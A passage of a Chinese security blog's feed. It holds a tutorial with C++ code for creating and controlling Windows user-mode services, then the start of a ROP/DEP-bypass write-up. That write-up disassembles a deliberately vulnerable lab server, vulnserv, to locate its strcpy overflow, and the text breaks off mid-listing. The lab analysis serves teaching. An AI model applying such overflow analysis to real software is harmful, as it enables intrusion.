    <category term="快速排序" scheme="https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"/>
    
    <category term="排序" scheme="https://4st.tech/tags/%E6%8E%92%E5%BA%8F/"/>
    
    <category term="归并排序" scheme="https://4st.tech/tags/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/"/>
    
    <category term="二分" scheme="https://4st.tech/tags/%E4%BA%8C%E5%88%86/"/>
    
    <category term="整数二分" scheme="https://4st.tech/tags/%E6%95%B4%E6%95%B0%E4%BA%8C%E5%88%86/"/>
    
    <category term="浮点数二分" scheme="https://4st.tech/tags/%E6%B5%AE%E7%82%B9%E6%95%B0%E4%BA%8C%E5%88%86/"/>
    
  </entry>
  
  <entry>
    <title>Windows下Ring3环服务的创建和使用</title>
    <link href="https://4st.tech/2021/04/26/ring3-huan-fu-wu-de-chuang-jian-he-shi-yong/"/>
    <id>https://4st.tech/2021/04/26/ring3-huan-fu-wu-de-chuang-jian-he-shi-yong/</id>
    <published>2021-04-26T07:45:22.000Z</published>
    <updated>2021-08-04T04:57:02.775Z</updated>
    
    <content type="html"><![CDATA[<h1 id="服务">服务</h1><p>是没有<code>UI</code>界面的程序，它要长期驻扎在后台的服务程序，任何用户都可以调用他提供的服务。</p><p>如打印机，我不挑程序，什么文档编辑的程序都可以使用我这台打印机来打印。他不需要<code>UI</code>之类的，你需要打印东西，就把你要打印的数据给我，我去让打印机打印就行了，所以就特别适合写成服务。</p><p>什么时候使用服务程序？</p><ul><li>需要长期在后台运行的程序（无UI需求）</li><li>为系统所有程序提供服务</li></ul><h1 id="服务的创建与使用">服务的创建与使用</h1><h2 id="服务的创建">服务的创建</h2><p>可以先创建一个控制台应用程序，然后在<code>main</code> 函数中做以下操作：</p><ul><li>填充<code>DispatchTable</code> 结构体数组，其每个成员是<code>SERVICE_TABLE_ENTRY</code> 类型，以<code>NULL, NULL</code> 结尾，标志该结构体数组结束<ul><li>第一个结构体的数据成员是服务名</li><li>第二个结构体的数据成员是服务的入口函数<code>SvcMain</code></li></ul></li><li>调用 <code>StartServiceCtrlDispatcher</code> 将控制台的入口函数转换到服务程序的入口函数处</li></ul><p>在服务的入口函数<code>SvcMain</code> 中需要做：</p><ul><li>通过<code>RegisterServiceCtrlHandler</code> 函数注册服务，传入服务控制函数的函数指针，其相当于消息循环的调度器。当有服务请求时，通过控制码就可以通过控制码来进行相应的操作</li><li>通过<code>CreateEvent</code> 创建一个事件，当发来请求需要将服务状态设置为停止状态，需要退出服务，因此需要事件来进行同步</li><li>将状态设置为运行状态，通过<code>SetServiceStatus</code> 设置</li></ul><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> WINAPI <span class="title">SvcMain</span><span class="params">(DWORD argc, LPTSTR* argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] SvcMain&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//注册服务控制处理</span></span><br><span class="line">  gSvcStatusHandle = <span class="built_in">RegisterServiceCtrlHandler</span>(SVCNAME, SvcCtrlHandler);</span><br><span class="line">  <span class="keyword">if</span> (!gSvcStatusHandle) &#123;</span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] 注册控制处理失败&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line">  gSvcStatus.dwServiceSpecificExitCode = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">ReportSvcStatus</span>(SERVICE_START_PENDING, NO_ERROR, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SvcInit</span>(argc, argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置服务当前状态</span></span><br><span class="line"><span class="function">VOID <span class="title">ReportSvcStatus</span><span class="params">(DWORD dwCurrentState,DWORD dwWin32ExitCode, DWORD dwWaitHint)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span> DWORD dwCheckPoint = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  gSvcStatus.dwCurrentState = dwCurrentState;</span><br><span class="line">  gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;</span><br><span class="line">  gSvcStatus.dwWaitHint = dwWaitHint;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dwCurrentState == SERVICE_START_PENDING)</span><br><span class="line">    gSvcStatus.dwControlsAccepted = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span> gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((dwCurrentState == SERVICE_RUNNING) ||</span><br><span class="line">    (dwCurrentState == SERVICE_STOPPED))</span><br><span class="line">    gSvcStatus.dwCheckPoint = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span> gSvcStatus.dwCheckPoint = dwCheckPoint++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//设置服务状态</span></span><br><span class="line">  <span class="built_in">SetServiceStatus</span>(gSvcStatusHandle, &amp;gSvcStatus);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//服务控制处理函数</span></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">SvcCtrlHandler</span><span class="params">(DWORD dwCtrl)</span> </span>&#123;</span><br><span class="line">  <span class="built_in"><span class="keyword">switch</span></span> (dwCtrl) &#123;</span><br><span class="line">  <span class="keyword">case</span> SERVICE_CONTROL_STOP:</span><br><span class="line">    <span class="built_in">ReportSvcStatus</span>(SERVICE_STOP_PENDING, NO_ERROR, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">SetEvent</span>(ghSvcStopEvent);</span><br><span class="line">    <span class="built_in">ReportSvcStatus</span>(gSvcStatus.dwCurrentState, NO_ERROR, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] 服务被停止&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">case</span> SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] 服务操作&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">SvcInit</span><span class="params">(DWORD dwArgc, LPTSTR* lpszArgv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] SvcInit&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建事件对象</span></span><br><span class="line">  ghSvcStopEvent = <span class="built_in">CreateEvent</span>(</span><br><span class="line">                              <span class="literal">NULL</span>,    <span class="comment">// default security attributes</span></span><br><span class="line">                              TRUE,    <span class="comment">// manual reset event</span></span><br><span class="line">                              FALSE,   <span class="comment">// not signaled</span></span><br><span class="line">                              <span class="literal">NULL</span>);   <span class="comment">// no name</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ghSvcStopEvent == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ReportSvcStatus</span>(SERVICE_STOPPED, NO_ERROR, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将状态设置为运行状态</span></span><br><span class="line">  <span class="built_in">ReportSvcStatus</span>(SERVICE_RUNNING, NO_ERROR, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(ghSvcStopEvent, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将服务状态设置为停止状态</span></span><br><span class="line">    <span class="built_in">ReportSvcStatus</span>(SERVICE_STOPPED, NO_ERROR, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] SvcInit return&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">  <span class="comment">//将控制台程序转换为服务程序</span></span><br><span class="line">  SERVICE_TABLE_ENTRY DispatchTable[] =</span><br><span class="line">  &#123;</span><br><span class="line">      &#123; (LPSTR)SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain &#125;,</span><br><span class="line">      &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">StartServiceCtrlDispatcher</span>(DispatchTable);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务的加载">服务的加载</h2><p>如果一个程序是 <code>ServiceMain</code> ，他就是一个服务程序。需要使用 <code>CreateService</code> 安装、 <code>StartServce</code> 开始、 <code>ControlService</code> 控制服务停止、 <code>DeleteService</code> 就是卸载服务。</p><p><code>CreateService</code> 来安装服务，其就是在注册表创建一个注册表选项。在调用安装等操作之前，需要创建服务管理器，让有权限的对象来进行这些操作，来提高安全性。</p><p>需要注意的是：得到的服务管理器对象的句柄和通过<code>CreateService</code> 等得到的服务对象的句柄需要关闭。</p><p>代码示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//显示错误信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowLastError</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  LPVOID lpMsgBuf;</span><br><span class="line">  <span class="built_in">FormatMessage</span>(</span><br><span class="line">    FORMAT_MESSAGE_ALLOCATE_BUFFER |</span><br><span class="line">    FORMAT_MESSAGE_FROM_SYSTEM |</span><br><span class="line">    FORMAT_MESSAGE_IGNORE_INSERTS,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="built_in">GetLastError</span>(),</span><br><span class="line">    <span class="built_in">MAKELANGID</span>(LANG_NEUTRAL, SUBLANG_DEFAULT), <span class="comment">// Default language</span></span><br><span class="line">    (LPTSTR)&amp; lpMsgBuf,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, lpMsgBuf);</span><br><span class="line">  <span class="built_in">LocalFree</span>(lpMsgBuf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装服务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Install</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SC_HANDLE hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SC_HANDLE hService = <span class="built_in">CreateService</span>(hSCM,</span><br><span class="line">                                    SVCNAME,</span><br><span class="line">                                    SVCNAME,</span><br><span class="line">                                    SERVICE_ALL_ACCESS,</span><br><span class="line">                                    SERVICE_KERNEL_DRIVER,</span><br><span class="line">                                    SERVICE_DEMAND_START,</span><br><span class="line">                                    SERVICE_ERROR_IGNORE,</span><br><span class="line">                                    SRVPATH,</span><br><span class="line">                                    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Install OK\n&quot;</span>);</span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Unload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SC_HANDLE hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SC_HANDLE hService = <span class="built_in">OpenService</span>(hSCM, SVCNAME, SERVICE_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">DeleteService</span>(hService)) &#123;</span><br><span class="line">      <span class="built_in">ShowLastError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Unload OK\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//启动服务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StartSrv</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SC_HANDLE hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SC_HANDLE hService = <span class="built_in">OpenService</span>(hSCM, SVCNAME, SERVICE_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">StartService</span>(hService, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">      <span class="built_in">ShowLastError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;StartSrv OK\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//停止服务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StopSrv</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SC_HANDLE hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SC_HANDLE hService = <span class="built_in">OpenService</span>(hSCM, SVCNAME, SERVICE_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    SERVICE_STATUS status;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ControlService</span>(hService, SERVICE_CONTROL_STOP, &amp;status)) &#123;</span><br><span class="line">      <span class="built_in">ShowLastError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;StopSrv OK\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭对象句柄</span></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务的使用">服务的使用</h2><p>可以自定义控制码，也可以使用系统提供的一些控制码，调用<code>ControlService</code> 来与<code>Ring3</code> 环的服务进行通信</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;服务&quot;&gt;服务&lt;/h1&gt;
&lt;p&gt;是没有&lt;code&gt;UI&lt;/code&gt;界面的程序，它要长期驻扎在后台的服务程序，任何用户都可以调用他提供的服务。&lt;/p&gt;
&lt;p&gt;如打印机，我不挑程序，什么文档编辑的程序都可以使用我这台打印机来打印。他不需要&lt;code&gt;UI&lt;/cod</summary>
      
    
    
    
    <category term="内核驱动编程" scheme="https://4st.tech/categories/%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="内核" scheme="https://4st.tech/tags/%E5%86%85%E6%A0%B8/"/>
    
    <category term="驱动" scheme="https://4st.tech/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>利用ROP突破DEP：分析expolit_me并做rop</title>
    <link href="https://4st.tech/2021/04/07/li-yong-rop-tu-po-dep-fen-xi-expolit-me-bing-zuo-rop/"/>
    <id>https://4st.tech/2021/04/07/li-yong-rop-tu-po-dep-fen-xi-expolit-me-bing-zuo-rop/</id>
    <published>2021-04-07T08:03:36.000Z</published>
    <updated>2021-08-04T04:57:02.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用rop突破dep分析expolit_me并做rop">利用ROP突破DEP：分析expolit_me并做rop</h1><h2 id="分析目标程序">分析目标程序</h2><p>使用OD打开<code>exploit_me</code>，找到关键的几个函数的参数：</p><p>创建<code>socket</code>的几个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0022FCB0   00000002  |Family = AF_INET</span><br><span class="line">0022FCB4   00000001  |Type = SOCK_STREAM</span><br><span class="line">0022FCB8   00000006  \Protocol = IPPROTO_TCP</span><br></pre></td></tr></table></figure><p><code>bind</code>的参数中最重要的是<code>ip</code> 地址和<code>端口号</code> 了，可以分析<code>sockaddr</code> 或者使用命令<code>netstat -ano</code></p><p>!<span class="citation" data-cites="获取绑定的ip和端口">[@获取绑定的ip和端口]</span>(https://cdn.jsdelivr.net/gh/m-Onst/pics@main/blog/202104/20210407162127.png)</p><p>可以获取到，其<code>bind</code>的是<code>0.0.0.0 : 9999</code></p><p>然后继续向下查看，在接受连接后，创建一个线程来进行处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00401765  |.  C74424 14 000&gt;|mov dword ptr ss:[esp+0x14],0x0                     ; |</span><br><span class="line">0040176D  |.  C74424 10 000&gt;|mov dword ptr ss:[esp+0x10],0x0                     ; |</span><br><span class="line">00401775  |.  8B85 F0FDFFFF |mov eax,[local.132]                                 ; |</span><br><span class="line">0040177B  |.  894424 0C     |mov dword ptr ss:[esp+0xC],eax                      ; |</span><br><span class="line">0040177F  |.  C74424 08 481&gt;|mov dword ptr ss:[esp+0x8],vulnserv.00401848        ; |</span><br><span class="line">00401787  |.  C74424 04 000&gt;|mov dword ptr ss:[esp+0x4],0x0                      ; |</span><br><span class="line">0040178F  |.  C70424 000000&gt;|mov dword ptr ss:[esp],0x0                          ; |</span><br><span class="line">00401796  |.  E8 9D160000   |call &lt;jmp.&amp;KERNEL32.CreateThread&gt;                   ; </span><br></pre></td></tr></table></figure><p>在线程回调函数的起始位置下<code>int3</code>断点，跟踪分析，找到了调用<code>strcpy</code>的子函数，其对应的命令是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00401CDB  |&gt; \C74424 08 050&gt;|mov dword ptr ss:[esp+0x8],0x5          ; |||</span><br><span class="line">00401CE3  |.  C74424 04 F34&gt;|mov dword ptr ss:[esp+0x4],vulnserv.004&gt;; |||ASCII &quot;TRUN &quot;</span><br><span class="line">00401CEB  |.  8B45 F0       |mov eax,[local.4]                       ; |||</span><br><span class="line">00401CEE  |.  890424        |mov dword ptr ss:[esp],eax              ; |||</span><br><span class="line">00401CF1  |.  E8 C2100000   |call &lt;jmp.&amp;msvcrt.strncmp&gt;              ; ||\strncmp</span><br><span class="line">00401CF6  |.  85C0          |test eax,eax                            ; ||</span><br><span class="line">00401CF8  |.  0F85 DC000000 |jnz vulnserv.00401DDA                   ; ||</span><br><span class="line">00401CFE  |.  C70424 B80B00&gt;|mov dword ptr ss:[esp],0xBB8            ; ||</span><br><span class="line">00401D05  |.  E8 B6100000   |call &lt;jmp.&amp;msvcrt.malloc&gt;               ; |\malloc</span><br></pre></td></tr></table></figure><p>当比较通过时，则会向下继续执行，并申请了<code>0xBB8</code>的堆大小，即：<code>3000</code> 个字节。然后将发送过来的数据拷贝到该堆中，然后调用<code>CallStrcpy</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401D51  |.  C74424 08 B80&gt;||mov dword ptr ss:[esp+0x8],0xBB8       ; | 拷贝长度</span><br><span class="line">00401D59  |.  8B45 F0       ||mov eax,[local.4]                      ; |</span><br><span class="line">00401D5C  |.  894424 04     ||mov dword ptr ss:[esp+0x4],eax         ; |</span><br><span class="line">00401D60  |.  8B85 A4FAFFFF ||mov eax,[local.343]                    ; |</span><br><span class="line">00401D66  |.  890424        ||mov dword ptr ss:[esp],eax             ; |</span><br><span class="line">00401D69  |.  E8 72100000   ||call &lt;jmp.&amp;msvcrt.strncpy&gt;             ; \strncpy</span><br></pre></td></tr></table></figure><p>然后在其后面调用了<code>strcpy</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00401808  /$  55            push ebp</span><br><span class="line">00401809  |.  89E5          mov ebp,esp</span><br><span class="line">0040180B  |.  81EC E8070000 sub esp,0x7E8</span><br><span class="line">00401811  |.  8B45 08       mov eax,[arg.1]                          ; |</span><br><span class="line">00401814  |.  894424 04     mov dword ptr ss:[esp+0x4],eax           ; |</span><br><span class="line">00401818  |.  8D85 28F8FFFF lea eax,[local.502]                      ; |</span><br><span class="line">0040181E  |.  890424        mov dword ptr 